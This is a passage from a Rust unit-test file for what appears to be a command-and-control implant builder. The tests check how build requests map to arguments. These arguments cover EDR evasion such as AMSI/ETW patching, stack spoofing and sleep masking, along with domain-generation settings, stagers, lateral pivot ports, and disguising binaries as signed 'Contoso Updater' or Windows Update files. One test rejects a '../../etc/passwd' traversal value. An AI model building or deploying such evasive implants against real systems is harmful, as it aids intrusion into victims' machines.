        assert!(has_pair(&a, "--indirect-syscalls", "false"));
        assert!(has_pair(&a, "--stack-spoof",       "false"));
        assert!(has_pair(&a, "--patch-amsi-etw",    "false"));
        assert!(has_pair(&a, "--heap-encrypt",      "false"));
    }

    #[test]
    fn args_evasion_flags_independently_toggled() {
        let mut r = base_req();
        r.indirect_syscalls = false; r.stack_spoof = false;
        r.patch_amsi_etw    = false; r.heap_encrypt = false;

        r.indirect_syscalls = true;
        let a = build_args(&r);
        assert!(has_pair(&a, "--indirect-syscalls", "true"));
        assert!(has_pair(&a, "--stack-spoof",       "false"));
        assert!(has_pair(&a, "--patch-amsi-etw",    "false"));
        assert!(has_pair(&a, "--heap-encrypt",      "false"));
    }

    #[test]
    fn args_guard_domain_included_when_set() {
        let mut r = base_req(); r.guard_domain = "CORP*".into();
        assert!(has_pair(&build_args(&r), "--guard-domain", "CORP*"));
    }

    #[test]
    fn args_guard_domain_omitted_when_empty() {
        assert!(!build_args(&base_req()).contains(&"--guard-domain".to_string()));
    }

    #[test]
    fn args_guard_hostname_included_when_set() {
        let mut r = base_req(); r.guard_hostname = "DESKTOP-*".into();
        assert!(has_pair(&build_args(&r), "--guard-hostname", "DESKTOP-*"));
    }

    #[test]
    fn args_guard_hostname_omitted_when_empty() {
        assert!(!build_args(&base_req()).contains(&"--guard-hostname".to_string()));
    }

    #[test]
    fn args_guard_hours_formatted_correctly() {
        let mut r = base_req();
        r.guard_hour_start = 8;
        r.guard_hour_end   = 18;
        assert!(has_pair(&build_args(&r), "--guard-hours", "8-18"));
    }

    #[test]
    fn args_guard_hours_omitted_when_both_zero() {
        assert!(!build_args(&base_req()).contains(&"--guard-hours".to_string()));
    }

    #[test]
    fn args_guard_hours_included_when_only_start_set() {
        let mut r = base_req(); r.guard_hour_start = 9;
        assert!(has_pair(&build_args(&r), "--guard-hours", "9-0"));
    }

    #[test]
    fn args_guard_hours_included_when_only_end_set() {
        let mut r = base_req(); r.guard_hour_end = 17;
        assert!(has_pair(&build_args(&r), "--guard-hours", "0-17"));
    }

    #[test]
    fn args_guard_no_system_included_when_true() {
        let mut r = base_req(); r.guard_no_system = true;
        assert!(build_args(&r).contains(&"--guard-no-system".to_string()));
    }

    #[test]
    fn args_guard_no_system_omitted_when_false() {
        assert!(!build_args(&base_req()).contains(&"--guard-no-system".to_string()));
    }

    #[test]
    fn args_sni_included_when_set() {
        let mut r = base_req(); r.sni_override = Some("cdn.example.com".into());
        assert!(has_pair(&build_args(&r), "--sni", "cdn.example.com"));
    }

    #[test]
    fn args_sni_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--sni".to_string()));
    }

    #[test]
    fn args_alpn_joined_with_comma() {
        let mut r = base_req(); r.alpn_protocols = vec!["h2".into(), "http/1.1".into()];
        assert!(has_pair(&build_args(&r), "--alpn", "h2,http/1.1"));
    }

    #[test]
    fn args_alpn_omitted_when_empty() {
        assert!(!build_args(&base_req()).contains(&"--alpn".to_string()));
    }

    #[test]
    fn args_hibernation_flag() {
        let mut r = base_req(); r.hibernation_mode = true;
        assert!(build_args(&r).contains(&"--hibernation".to_string()));
    }

    #[test]
    fn args_hibernation_omitted_when_false() {
        assert!(!build_args(&base_req()).contains(&"--hibernation".to_string()));
    }

    #[test]
    fn args_batch_size_forwarded() {
        let mut r = base_req(); r.batch_size = Some(5);
        assert!(has_pair(&build_args(&r), "--batch-size", "5"));
    }

    #[test]
    fn args_batch_size_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--batch-size".to_string()));
    }

    // ── auto_pivot_port ───────────────────────────────────────────────

    #[test]
    fn args_auto_pivot_port_included_when_set() {
        let mut r = base_req(); r.auto_pivot_port = Some(5002);
        assert!(has_pair(&build_args(&r), "--auto-pivot-port", "5002"));
    }

    #[test]
    fn args_auto_pivot_port_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--auto-pivot-port".to_string()));
    }

    #[test]
    fn args_auto_pivot_port_various_ports() {
        for port in [1024u16, 5001, 8080, 65535] {
            let mut r = base_req(); r.auto_pivot_port = Some(port);
            assert!(
                has_pair(&build_args(&r), "--auto-pivot-port", &port.to_string()),
                "port={port}"
            );
        }
    }

    // ── Serde defaults ────────────────────────────────────────────────

    #[test]
    fn serde_defaults_evasion_on() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.sleep_mask, "ekko");
        assert!(r.indirect_syscalls, "indirect_syscalls should default true");
        assert!(r.stack_spoof,       "stack_spoof should default true");
        assert!(r.patch_amsi_etw,    "patch_amsi_etw should default true");
        assert!(r.heap_encrypt,      "heap_encrypt should default true");
    }

    #[test]
    fn serde_defaults_guardrails_off() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.guard_domain,     "");
        assert_eq!(r.guard_hostname,   "");
        assert_eq!(r.guard_hour_start, 0);
        assert_eq!(r.guard_hour_end,   0);
        assert!(!r.guard_no_system);
    }

    #[test]
    fn serde_auto_pivot_port_defaults_none() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert!(r.auto_pivot_port.is_none());
    }

    #[test]
    fn serde_auto_pivot_port_explicit_value() {
        let r = from_json(r#"{"host":"h","port":"p","auto_pivot_port":5003}"#);
        assert_eq!(r.auto_pivot_port, Some(5003));
    }

    #[test]
    fn serde_auto_pivot_port_explicit_null() {
        let r = from_json(r#"{"host":"h","port":"p","auto_pivot_port":null}"#);
        assert!(r.auto_pivot_port.is_none());
    }

    #[test]
    fn serde_evasion_selectively_disabled() {
        let r = from_json(
            r#"{"host":"h","port":"p","indirect_syscalls":false,"patch_amsi_etw":false}"#,
        );
        assert!(!r.indirect_syscalls);
        assert!(!r.patch_amsi_etw);
        assert!(r.stack_spoof,  "unspecified field should still default true");
        assert!(r.heap_encrypt, "unspecified field should still default true");
    }

    #[test]
    fn serde_sleep_mask_explicit_ekko() {
        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"ekko"}"#);
        assert_eq!(r.sleep_mask, "ekko");
    }

    #[test]
    fn serde_sleep_mask_explicit_spoofed_stack() {
        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"spoofed-stack"}"#);
        assert_eq!(r.sleep_mask, "spoofed-stack");
    }

    #[test]
    fn serde_sleep_mask_explicit_none() {
        let r = from_json(r#"{"host":"h","port":"p","sleep_mask":"none"}"#);
        assert_eq!(r.sleep_mask, "none");
    }

    #[test]
    fn serde_guardrails_fully_populated() {
        let r = from_json(r#"{
            "host":"h","port":"p",
            "guard_domain":"CORP*",
            "guard_hostname":"DESKTOP-*",
            "guard_hour_start":8,
            "guard_hour_end":18,
            "guard_no_system":true
        }"#);
        assert_eq!(r.guard_domain,     "CORP*");
        assert_eq!(r.guard_hostname,   "DESKTOP-*");
        assert_eq!(r.guard_hour_start, 8);
        assert_eq!(r.guard_hour_end,   18);
        assert!(r.guard_no_system);
    }

    #[test]
    fn serde_defaults_core_fields() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.platform,   "linux");
        assert_eq!(r.transport,  "tls");
        assert_eq!(r.profile,    "default");
        assert_eq!(r.format,     "exe");
        assert_eq!(r.sleep,      40);
        assert_eq!(r.jitter_min, 0);
        assert_eq!(r.jitter_max, 100);
        assert_eq!(r.bloat,      0);
        assert_eq!(r.days,       0);
    }

    // ── validate_request - profile ────────────────────────────────────

    #[test]
    fn validate_ok_all_profiles() {
        for p in ["default", "http_post", "http_image"] {
            let mut r = base_req(); r.profile = p.into();
            assert!(validate_request(&r).is_ok(), "profile={p}");
        }
    }

    #[test]
    fn validate_err_unknown_profile() {
        let mut r = base_req(); r.profile = "slack".into();
        assert!(validate_request(&r).unwrap_err().contains("profile"));
    }

    // ── build_args - core fields not yet explicitly covered ───────────

    #[test]
    fn args_bloat_nonzero_forwarded() {
        let mut r = base_req(); r.bloat = 10;
        assert!(has_pair(&build_args(&r), "--bloat", "10"));
    }

    #[test]
    fn args_bloat_zero_still_forwarded() {
        assert!(has_pair(&build_args(&base_req()), "--bloat", "0"));
    }

    #[test]
    fn args_days_nonzero_forwarded() {
        let mut r = base_req(); r.days = 30;
        assert!(has_pair(&build_args(&r), "--days", "30"));
    }

    #[test]
    fn args_days_zero_still_forwarded() {
        assert!(has_pair(&build_args(&base_req()), "--days", "0"));
    }

    #[test]
    fn args_platform_windows_forwarded() {
        let mut r = base_req(); r.platform = "windows".into();
        assert!(has_pair(&build_args(&r), "--platform", "windows"));
    }

    #[test]
    fn args_platform_macos_forwarded() {
        let mut r = base_req(); r.platform = "macos".into();
        assert!(has_pair(&build_args(&r), "--platform", "macos"));
    }

    #[test]
    fn args_format_dll_forwarded() {
        let mut r = base_req(); r.format = "dll".into();
        assert!(has_pair(&build_args(&r), "--format", "dll"));
    }

    #[test]
    fn args_format_stager_forwarded() {
        let mut r = base_req(); r.format = "stager".into();
        assert!(has_pair(&build_args(&r), "--format", "stager"));
    }

    // ── build_args - guard hours edge cases ──────────────────────────

    #[test]
    fn args_guard_hours_only_end_set() {
        let mut r = base_req(); r.guard_hour_end = 17;
        assert!(has_pair(&build_args(&r), "--guard-hours", "0-17"));
    }

    #[test]
    fn args_guard_hours_max_boundary() {
        let mut r = base_req();
        r.guard_hour_start = 23;
        r.guard_hour_end   = 23;
        assert!(has_pair(&build_args(&r), "--guard-hours", "23-23"));
    }

    #[test]
    fn args_guard_hours_full_day_window() {
        let mut r = base_req();
        r.guard_hour_start = 0;
        r.guard_hour_end   = 23;
        assert!(has_pair(&build_args(&r), "--guard-hours", "0-23"));
    }

    // ── build_args - no unexpected duplicates ─────────────────────────

    #[test]
    fn args_sleep_mask_appears_exactly_once() {
        let r = base_req();
        let a = build_args(&r);
        let count = a.iter().filter(|s| s.as_str() == "--sleep-mask").count();
        assert_eq!(count, 1, "--sleep-mask should appear exactly once");
    }

    #[test]
    fn args_host_appears_exactly_once() {
        let r = base_req();
        let a = build_args(&r);
        assert_eq!(a.iter().filter(|s| s.as_str() == "--host").count(), 1);
    }

    #[test]
    fn args_auto_pivot_port_appears_at_most_once() {
        let mut r = base_req(); r.auto_pivot_port = Some(5002);
        let a = build_args(&r);
        assert_eq!(a.iter().filter(|s| s.as_str() == "--auto-pivot-port").count(), 1);
    }

    // ── Artifact customization (name / icon / certs_dir) ──────────────

    #[test]
    fn args_name_forwarded() {
        let mut r = base_req(); r.name = Some("health_probe".into());
        assert!(has_pair(&build_args(&r), "--name", "health_probe"));
    }

    #[test]
    fn args_name_omitted_when_none() {
        assert!(!build_args(&base_req()).contains(&"--name".to_string()));
    }

    #[test]
    fn args_icon_path_forwarded_as_icon() {
        let mut r = base_req(); r.icon = Some("/tmp/x.ico".into());
        assert!(has_pair(&build_args(&r), "--icon", "/tmp/x.ico"));
    }

    #[test]
    fn args_icon_bare_name_forwarded_as_preset() {
        let mut r = base_req(); r.icon = Some("driver".into());
        assert!(has_pair(&build_args(&r), "--icon-preset", "driver"));
        assert!(!build_args(&r).contains(&"--icon".to_string()));
    }

    #[test]
    fn args_icon_preset_forwarded() {
        let mut r = base_req(); r.icon_preset = Some("windows_update".into());
        assert!(has_pair(&build_args(&r), "--icon-preset", "windows_update"));
    }

    #[test]
    fn args_certs_dir_forwarded() {
        let mut r = base_req(); r.certs_dir = Some("/tmp/certs".into());
        assert!(has_pair(&build_args(&r), "--certs-dir", "/tmp/certs"));
    }

    #[test]
    fn validate_err_bad_name_charset() {
        let mut r = base_req(); r.name = Some("bad name!".into());
        assert!(validate_request(&r).unwrap_err().contains("name"));
    }

    #[test]
    fn validate_err_icon_preset_traversal() {
        let mut r = base_req(); r.icon_preset = Some("../../etc/passwd".into());
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_err_partial_certs_upload() {
        let mut r = base_req();
        r.certs_ca_b64 = Some("Y2E=".into());
        assert!(validate_request(&r).unwrap_err().contains("certs bundle"));
    }

    #[test]
    fn validate_ok_full_certs_upload() {
        let mut r = base_req();
        r.certs_ca_b64         = Some("Y2E=".into());
        r.certs_client_crt_b64 = Some("Y3J0".into());
        r.certs_client_key_b64 = Some("a2V5".into());
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn serde_defaults_customization_none() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert!(r.name.is_none());
        assert!(r.icon.is_none());
        assert!(r.icon_preset.is_none());
        assert!(r.certs_dir.is_none());
        assert!(r.icon_b64.is_none());
        assert!(r.certs_ca_b64.is_none());
        assert!(r.certs_client_crt_b64.is_none());
        assert!(r.certs_client_key_b64.is_none());
    }

    // ── PE / ELF customization ─────────────────────────────────────────

    #[test]
    fn validate_ok_pe_fields() {
        let mut r = base_req();
        r.pe_company         = Some("Contoso Ltd".into());
        r.pe_product         = Some("Contoso Updater".into());
        r.pe_description     = Some("Contoso Update Service".into());
        r.pe_file_version    = Some("10.0.19041.1".into());
        r.pe_product_version = Some("10.0.0.0".into());
        r.elf_comment        = Some("rcm-build".into());
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_bad_pe_version() {
        let mut r = base_req();
        r.pe_file_version = Some("1.2.3".into());
        assert!(validate_request(&r).is_err());
        r.pe_file_version = Some("1.2.3.99999".into());
        assert!(validate_request(&r).is_err());
        r.pe_file_version = Some("a.b.c.d".into());
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn build_args_forwards_pe_and_elf_fields() {
        let mut r = base_req();
        r.pe_company         = Some("Contoso Ltd".into());
        r.pe_product         = Some("Contoso Updater".into());
        r.pe_description     = Some("Contoso Update Service".into());
        r.pe_file_version    = Some("1.2.3.4".into());
        r.pe_product_version = Some("5.6.7.8".into());
        r.elf_comment        = Some("rcm-build".into());
        let a = build_args(&r);
        assert!(has_pair(&a, "--pe-company", "Contoso Ltd"));
        assert!(has_pair(&a, "--pe-product", "Contoso Updater"));
        assert!(has_pair(&a, "--pe-description", "Contoso Update Service"));
        assert!(has_pair(&a, "--pe-file-version", "1.2.3.4"));
        assert!(has_pair(&a, "--pe-product-version", "5.6.7.8"));
        assert!(has_pair(&a, "--elf-comment", "rcm-build"));
    }

    #[test]
    fn build_args_omits_pe_and_elf_when_unset() {
        let a = build_args(&base_req());
        assert!(!a.iter().any(|x| x.starts_with("--pe-")));
        assert!(!a.iter().any(|x| x == "--elf-comment"));
    }

    #[test]
    fn from_json_parses_pe_and_elf_fields() {
        let r = from_json(r#"{"host":"h","port":"4443","pe_company":"C","pe_file_version":"1.2.3.4","elf_comment":"x"}"#);
        assert_eq!(r.pe_company.as_deref(), Some("C"));
        assert_eq!(r.pe_file_version.as_deref(), Some("1.2.3.4"));
        assert_eq!(r.elf_comment.as_deref(), Some("x"));
        assert!(r.pe_product.is_none());
    }

    // ── Signing metadata overrides / allow_vm ─────────────────────────

    #[test]
    fn args_sign_tristate() {
        // Unset: no sign flag at all - the builder auto-decides from cert
        // availability (sign_cert set or certs/rcm_sign.p12 present).
        let a = build_args(&base_req());
        assert!(!a.iter().any(|x| x == "--sign" || x == "--no-sign"));
        // Explicit true forces --sign, explicit false forces --no-sign.
        let mut r = base_req();
        r.sign = Some(true);
        let a = build_args(&r);
        assert!(a.iter().any(|x| x == "--sign"));
        assert!(!a.iter().any(|x| x == "--no-sign"));
        let mut r = base_req();
        r.sign = Some(false);
        let a = build_args(&r);
        assert!(a.iter().any(|x| x == "--no-sign"));
        assert!(!a.iter().any(|x| x == "--sign"));
    }

    #[test]
    fn args_sign_metadata_forwarded_when_signing() {
        let mut r = base_req();
        r.sign = Some(true);
        r.sign_name = Some("Contoso Updater".into());
        r.sign_url  = Some("https://contoso.example/".into());
        r.sign_cn   = Some("Contoso".into());
        let a = build_args(&r);
        assert!(has_pair(&a, "--sign-name", "Contoso Updater"));
        assert!(has_pair(&a, "--sign-url",  "https://contoso.example/"));
        assert!(has_pair(&a, "--sign-cn",   "Contoso"));
    }

    #[test]
    fn args_sign_cert_forwarded_without_explicit_sign() {
        // Extras ride along on their own: sign_cert alone is enough for the
        // builder's auto default to sign, so it must not be gated on sign.
        let mut r = base_req();
        r.sign_cert = Some("certs/rcm_sign.p12".into());
        let a = build_args(&r);
        assert!(has_pair(&a, "--sign-cert", "certs/rcm_sign.p12"));
        assert!(!a.iter().any(|x| x == "--sign" || x == "--no-sign"));
    }

    #[test]
    fn args_allow_vm_forwarded_only_when_set() {
        assert!(!build_args(&base_req()).contains(&"--allow-vm".to_string()));
        let mut r = base_req();
        r.allow_vm = true;
        assert!(build_args(&r).contains(&"--allow-vm".to_string()));
    }

    // ── prune_jobs retention ──────────────────────────────────────────

    fn job(id: &str, status: BuildStatus, finished_at: Option<String>) -> BuildJob {
        BuildJob {
            id: id.into(),
            status,
            log: Vec::new(),
            artifact_path: None,
            build_id: None,
            started_at: "2026-01-01T00:00:00+00:00".into(),
            finished_at,
            operator: "op".into(),
        }
    }

    // ── Log harvest (artifact path + internal build id) ───────────────

    #[test]
    fn harvest_log_value_extracts_builder_markers() {
        let log = vec![
            "[*] Toolchain: nightly-2026-08-22".to_string(),
            // The builder pads the label; harvest must trim the value.
            "[*] Build ID:     4f3b2c1d-1111-2222-3333-444455556666".to_string(),
            "[+] Binary: /proj/dist/agent_abc123.exe".to_string(),
            // The staged-payload line must NOT be mistaken for the artifact.
            "[+] Staged payload: /proj/dist/staged_4f3b.payload (server: /stage/4f3b)".to_string(),
        ];
        assert_eq!(
            harvest_log_value(&log, "[*] Build ID:").as_deref(),
            Some("4f3b2c1d-1111-2222-3333-444455556666")
        );
        assert_eq!(
            harvest_log_value(&log, "[+] Binary: ").as_deref(),
            Some("/proj/dist/agent_abc123.exe")
        );
        // Missing markers yield None (build still running or failed early).
        assert!(harvest_log_value(&log, "[+] Nonexistent: ").is_none());
        assert!(harvest_log_value(&[], "[*] Build ID:").is_none());
    }

    #[test]
    fn prune_jobs_drops_expired_finished_jobs() {
        let mut jobs = std::collections::HashMap::new();
        // Finished long before the TTL.
        jobs.insert("old".into(), job("old", BuildStatus::Failed,
            Some("2001-01-01T00:00:00+00:00".into())));
        // Finished now (within TTL).
        jobs.insert("new".into(), job("new", BuildStatus::Success,
            Some(Utc::now().to_rfc3339())));
        // Running jobs are never evicted, whatever their timestamps say.
        jobs.insert("run".into(), job("run", BuildStatus::Running, None));
        prune_jobs(&mut jobs);
        assert!(!jobs.contains_key("old"));
        assert!(jobs.contains_key("new"));
        assert!(jobs.contains_key("run"));
    }

    #[test]
    fn prune_jobs_caps_finished_job_count() {
        let mut jobs = std::collections::HashMap::new();
        let now = Utc::now().to_rfc3339();
        for i in 0..(MAX_FINISHED_JOBS + 10) {
            let id = format!("job{:04}", i);
            jobs.insert(id.clone(), job(&id, BuildStatus::Success, Some(now.clone())));
        }
        jobs.insert("run".into(), job("run", BuildStatus::Running, None));
        prune_jobs(&mut jobs);
        assert_eq!(jobs.len(), MAX_FINISHED_JOBS + 1, "cap + the running job");
        assert!(jobs.contains_key("run"));
        // The jobs all share one timestamp, so eviction picks by id order -
        // only the count matters here.
    }

    #[test]
    fn prune_jobs_keeps_everything_under_limits() {
        let mut jobs = std::collections::HashMap::new();
        let now = Utc::now().to_rfc3339();
        jobs.insert("a".into(), job("a", BuildStatus::Success, Some(now.clone())));
        jobs.insert("b".into(), job("b", BuildStatus::Failed, Some(now)));
        jobs.insert("c".into(), job("c", BuildStatus::Running, None));
        prune_jobs(&mut jobs);
        assert_eq!(jobs.len(), 3);
    }

    // ── wait_verdict ──────────────────────────────────────────────────

    #[cfg(unix)]
    #[test]
    fn wait_verdict_maps_exit_statuses() {
        use std::os::unix::process::ExitStatusExt;
        // Raw wait status 0 = exit code 0; 1<<8 = exit code 1.
        assert_eq!(
            wait_verdict(Ok(Ok(std::process::ExitStatus::from_raw(0)))),
            WaitVerdict::Exited(true)
        );
        assert_eq!(
            wait_verdict(Ok(Ok(std::process::ExitStatus::from_raw(1 << 8)))),
            WaitVerdict::Exited(false)
        );
        assert_eq!(
            wait_verdict(Ok(Err(std::io::Error::new(std::io::ErrorKind::Other, "x")))),
            WaitVerdict::Exited(false)
        );
    }

    #[tokio::test]
    async fn wait_verdict_maps_elapsed_to_timed_out() {
        // tokio::time::error::Elapsed has no public constructor - produce a
        // real one with a tiny timeout around a never-completing future.
        let res = tokio::time::timeout(
            std::time::Duration::from_millis(1),
            std::future::pending::<std::io::Result<std::process::ExitStatus>>(),
        ).await;
        assert_eq!(wait_verdict(res), WaitVerdict::TimedOut);
    }

    // ── C-15: profile_json / fallback_json / dga_* plumbing ───────────

    /// Valid profile JSON produced by the same type the builder parses.
    fn valid_profile_json() -> String {
        serde_json::to_string(&crate::common::MalleableProfile::default()).unwrap()
    }

    /// Valid fallback JSON produced by the same type the builder parses.
    fn valid_fallback_json() -> String {
        serde_json::to_string(&crate::common::FallbackConfig::default()).unwrap()
    }

    #[test]
    fn validate_ok_profile_and_fallback_json() {
        let mut r = base_req();
        r.profile_json = Some(valid_profile_json());
        r.fallback_json = Some(valid_fallback_json());
        assert!(validate_request(&r).is_ok());
        // Each on its own is fine too.
        let mut r = base_req();
        r.profile_json = Some(valid_profile_json());
        assert!(validate_request(&r).is_ok());
        let mut r = base_req();
        r.fallback_json = Some(valid_fallback_json());
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_profile_json_unparseable() {
        for bad in ["not json", "{}", "[1,2,3]", "\"x\""] {
            let mut r = base_req();
            r.profile_json = Some(bad.into());
            assert!(validate_request(&r).unwrap_err().contains("profile_json"), "input={bad}");
        }
    }

    #[test]
    fn validate_err_fallback_json_unparseable() {
        for bad in ["not json", "{}", "[1,2,3]", "\"x\""] {
            let mut r = base_req();
            r.fallback_json = Some(bad.into());
            assert!(validate_request(&r).unwrap_err().contains("fallback_json"), "input={bad}");
        }
    }

    #[test]
    fn validate_err_inline_json_too_large() {
        let mut r = base_req();
        r.profile_json = Some(" ".repeat(MAX_INLINE_JSON_BYTES + 1));
        assert!(validate_request(&r).unwrap_err().contains("profile_json"));
        let mut r = base_req();
        r.fallback_json = Some(" ".repeat(MAX_INLINE_JSON_BYTES + 1));
        assert!(validate_request(&r).unwrap_err().contains("fallback_json"));
    }

    #[test]
    fn validate_dga_window_bounds() {
        for (v, ok) in [(59u64, false), (60, true), (2_592_000, true), (2_592_001, false)] {
            let mut r = base_req();
            r.dga_window = v;
            assert_eq!(validate_request(&r).is_ok(), ok, "dga_window={v}");
        }
    }

    #[test]
    fn validate_dga_count_bounds() {
        for (v, ok) in [(0u32, false), (1, true), (256, true), (257, false)] {
            let mut r = base_req();
            r.dga_count = v;
            assert_eq!(validate_request(&r).is_ok(), ok, "dga_count={v}");
        }
    }

    #[test]
    fn validate_dga_tlds() {
        for (v, ok) in [
            ("com,net,org", true), ("io", true), ("a-b", true),
            ("", false), ("com,,net", false), ("bad_label!", false), ("has.dot", false),
            ("com,net,org,io,co,uk,de,fr,jp,cn,ru,br,in,au,nl,se,bz", false), // 17 > 16
        ] {
            let mut r = base_req();
            r.dga_tlds = v.into();
            assert_eq!(validate_request(&r).is_ok(), ok, "dga_tlds={v}");
        }
    }

    #[test]
    fn args_profile_and_fallback_file_forwarded() {
        let mut r = base_req();
        r.profile_file = Some("/tmp/rcm-build-x/profile.json".into());
        r.fallback_file = Some("/tmp/rcm-build-x/fallback.json".into());
        let a = build_args(&r);
        assert!(has_pair(&a, "--profile-file", "/tmp/rcm-build-x/profile.json"));
        assert!(has_pair(&a, "--fallback-file", "/tmp/rcm-build-x/fallback.json"));
    }

    #[test]
    fn args_inline_json_not_forwarded_without_materialization() {
        // profile_json/fallback_json content is materialized by start_build;
        // build_args must never forward inline content or a raw flag.
        let mut r = base_req();
        r.profile_json = Some(valid_profile_json());
        r.fallback_json = Some(valid_fallback_json());
        let a = build_args(&r);
        assert!(!a.iter().any(|x| x.starts_with("--profile-file")));
        assert!(!a.iter().any(|x| x.starts_with("--fallback-file")));
    }

    #[test]
    fn args_dga_forwarded_with_seed() {
        let mut r = base_req();
        r.dga_seed = Some(42);
        let a = build_args(&r);
        assert!(has_pair(&a, "--dga-seed", "42"));
        assert!(has_pair(&a, "--dga-window", "86400"));
        assert!(has_pair(&a, "--dga-count", "16"));
        assert!(has_pair(&a, "--dga-tlds", "com,net,org"));
    }

    #[test]
    fn args_dga_custom_values_forwarded() {
        let mut r = base_req();
        r.dga_seed = Some(7);
        r.dga_window = 3600;
        r.dga_count = 4;
        r.dga_tlds = "io,co".into();
        let a = build_args(&r);
        assert!(has_pair(&a, "--dga-seed", "7"));
        assert!(has_pair(&a, "--dga-window", "3600"));
        assert!(has_pair(&a, "--dga-count", "4"));
        assert!(has_pair(&a, "--dga-tlds", "io,co"));
    }

    #[test]
    fn args_dga_omitted_without_seed() {
        let a = build_args(&base_req());
        assert!(!a.iter().any(|x| x.starts_with("--dga-")));
    }

    #[test]
    fn serde_dga_and_inline_json_defaults() {
        let r = from_json(r#"{"host":"h","port":"p"}"#);
        assert_eq!(r.dga_seed, None);
        assert_eq!(r.dga_window, 86400);
        assert_eq!(r.dga_count, 16);
        assert_eq!(r.dga_tlds, "com,net,org");
        assert!(r.profile_json.is_none());
        assert!(r.fallback_json.is_none());
        assert!(r.profile_file.is_none());
        assert!(r.fallback_file.is_none());
    }

    #[test]
    fn serde_dga_explicit_values() {
        let r = from_json(r#"{"host":"h","port":"p","dga_seed":99,"dga_window":600,"dga_count":3,"dga_tlds":"io"}"#);
        assert_eq!(r.dga_seed, Some(99));
        assert_eq!(r.dga_window, 600);
        assert_eq!(r.dga_count, 3);
        assert_eq!(r.dga_tlds, "io");
    }

    // ── C-13/H-09: valid_parents ──────────────────────────────────────

    #[test]
    fn validate_valid_parents_matrix() {
        for (v, ok) in [
            ("", true),
            ("explorer.exe", true),
            ("explorer.exe,svchost.exe", true),
            ("explorer.exe,,svchost.exe", false),
            ("explorer.exe,", false),
            ("C:\\Windows\\explorer.exe", false),
            ("/usr/bin/init", false),
        ] {
            let mut r = base_req();
            r.valid_parents = v.into();
            assert_eq!(validate_request(&r).is_ok(), ok, "valid_parents={v}");
        }
        // Over 32 entries is rejected.
        let mut r = base_req();
        r.valid_parents = "a.exe,".repeat(33);
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn args_valid_parents_forwarded_only_when_set() {
        assert!(!build_args(&base_req()).iter().any(|x| x == "--valid-parents"));
        let mut r = base_req();
        r.valid_parents = "explorer.exe,svchost.exe".into();
        assert!(has_pair(&build_args(&r), "--valid-parents", "explorer.exe,svchost.exe"));
    }

    // ── C-12: egress proxy ────────────────────────────────────────────

    #[test]
    fn validate_proxy_matrix() {
        // No proxy fields at all: fine.
        assert!(validate_request(&base_req()).is_ok());
        // URL with and without credentials.
        let mut r = base_req();
        r.proxy_url = Some("http://proxy.corp.com:8080".into());
        assert!(validate_request(&r).is_ok());
        r.proxy_user = Some("u".into());
        r.proxy_pass = Some("p".into());
        assert!(validate_request(&r).is_ok());
        // Schemeless URL rejected.
        let mut r = base_req();
        r.proxy_url = Some("proxy.corp.com:8080".into());
        assert!(validate_request(&r).is_err());
        // Credentials without a URL rejected.
        let mut r = base_req();
        r.proxy_user = Some("u".into());
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn args_proxy_forwarded() {
        let mut r = base_req();
        r.proxy_url = Some("http://proxy.corp.com:8080".into());
        r.proxy_user = Some("u".into());
        let a = build_args(&r);
        assert!(has_pair(&a, "--proxy-url", "http://proxy.corp.com:8080"));
        assert!(has_pair(&a, "--proxy-user", "u"));
        assert!(!a.iter().any(|x| x == "--proxy-pass"));
        // Nothing forwarded when unset.
        let a = build_args(&base_req());
        assert!(!a.iter().any(|x| x.starts_with("--proxy-")));
    }

    // ── Stager transport gate ─────────────────────────────────────────

    #[test]
    fn validate_stager_transport_gate() {
        for (t, ok) in [("http", true), ("https", true), ("tls", false), ("tcp_plain", false), ("named_pipe", false)] {
            let mut r = base_req();
            r.format = "stager".into();
            r.transport = t.into();
            assert_eq!(validate_request(&r).is_ok(), ok, "transport={t}");
        }
        // Other formats keep working on every transport.
        for t in ["tls", "tcp_plain"] {
            let mut r = base_req();
            r.transport = t.into();
            assert!(validate_request(&r).is_ok(), "transport={t}");
        }
    }
}
